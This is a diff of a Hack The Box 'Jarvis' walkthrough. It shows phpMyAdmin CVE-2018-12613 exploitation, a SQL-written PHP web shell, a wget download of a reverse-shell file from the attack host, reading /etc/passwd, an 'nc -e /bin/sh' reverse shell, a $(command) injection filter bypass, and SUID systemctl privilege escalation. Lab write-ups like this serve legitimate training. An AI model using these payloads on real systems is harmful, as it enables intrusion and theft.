@@ -255,7 +255,7 @@ database management system users password hashes:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
 
 + The version of phpMyAdmin is 4.8.0, and check whether it has any exploits: `searchsploit phpMyAdmin 4.8`
-+ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) in this version. 
++ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) in this version. 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4f986e6f-096f-4030-9912-23431041e16f)
 
@@ -265,7 +265,13 @@ database management system users password hashes:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/658da495-e482-42e9-a463-b695e97e7f4f)
 
-+ Run a SQL statement getting some php code I want to run on the site: `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/cmd.php"`
++ Run a SQL statement getting some php code I want to run on the site:
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/cmd.php"
+
+# Alternatively:
+select '<?php exec("wget -O /var/www/html/revshell.php http://10.10.14.8/revshell.php"); ?>'
+```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2665c910-1105-4e8b-a6d5-10ad9567f15c)
 
@@ -274,6 +280,10 @@ database management system users password hashes:
 + And then visit `http://10.10.10.143/cmd.php?cmd=id`.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/15d4bb2e-bf8a-4c48-b27a-4699a2d620b0)
+
++ Read **/etc/passwd**: `http://10.10.10.143/cmd.php?cmd=cat%20/etc/passwd`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9727c9b-435b-420b-8eb5-8397f61296fb)
 
 + Trigger to get the shell `http://10.10.10.143/cmd.php?cmd=nc -e /bin/sh 10.10.14.8 4444`.
 + Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
@@ -326,16 +336,16 @@ stty rows 55 columns 285
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f6be1913-5e3d-40f3-9f52-fc9a95d3ac54)
 
-+ The script is a python3 script used to manage and provide statistics on the webserver.
++ The script is a python3 script, and this script shows some statistics about attackers, their IPs and it can ping IPs.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bd5e772-f309-4fd5-9650-b12a1b456a63)
 
-+ **exec_ping()** is called directly from main if the `-p` is given. The `-p` option calls the **exec_ping()** command. There's a system or subprocess call. That controls `'&', ';', '-', '`', '||', '|'` characters. 
++ **exec_ping()** is called directly from main if the `-p` is given. The `-p` option calls the **exec_ping()** command. There's a system or subprocess call. That blocks `'&', ';', '-', '`', '||', '|'` special characters, and we cannot use them.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/73259250-7d4f-4c37-81bc-59119c98d5ef)
 
-+ There's a clear command injection in the exec_ping code where the input is read to **command**.
-+ **$(command)** can be used as a bash substitution, and hence the weak sanitization can be bypassed.
++ There's a clear command injection in the exec_ping code where the input is read to **command**. It calls **os.system('ping' + command)**. The command parameter is not correctly handled, so we can inject code there. 
++ But instead of these, **$(command)** with the Dollar sign ($) can be used to execute other commands.
 + Notice that the dollar sign is allowed, and run the command:
 ```
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -343,7 +353,7 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 Enter an IP: $(/bin/bash)
 ```
 
-+ The new shell is not working properly. It only shows stderr. Redirect stdout to our shell using: `>&2 /bin/bash`
++ **The new shell is not working properly. It only shows stderr. Redirect stdout to our shell using:** `>&2 /bin/bash`
 + Get the pepper's shell, and read the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd05cba2-ac58-4f92-9642-2d2ee150e7ca)
@@ -386,6 +396,7 @@ SYSTEMD_EDITOR=$TF systemctl edit system.slice
 ### Method 2
 + **/bin/systemctl** binary has the setuid bit set, and it's owned by root. This binary is a systemd utility which is responsible for Controlling the systemd system and service manager. It creates and manages services.
 + And in this case, only root and users in the group pepper can run it, and it will run as root.
++ If we create such a service, we can run it with root privileges, since systemctl has the SUID enabled, and the binary owner is root.
 + First, create a **shell.service** file on the attack machine:
 ```
 [Unit]
@@ -416,23 +427,28 @@ WantedBy=multi-user.target
 
 
 # Technical Knowledge
-+ xxx
++ https://dev.mysql.com/doc/refman/5.7/en/select.html
++ https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
++ https://en.wikipedia.org/wiki/Systemd
++ 
 
 
 # CVE Scripting
-+ xxx
++ **CVE-2018-12613:** https://www.exploit-db.com/exploits/44928
++ https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
 
 
 # References & Alternatives
 + https://vvmlist.github.io/#jarvis
 + https://shreyapohekar.com/blogs/jarvis-hackthebox-walkthrough/
 + https://pwnedcoffee.com/hackthebox/jarvis/
-+ 
++ https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
 + https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
++ 
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
 + https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
 + https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
-+ https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
++ 
 + xxx
 
 
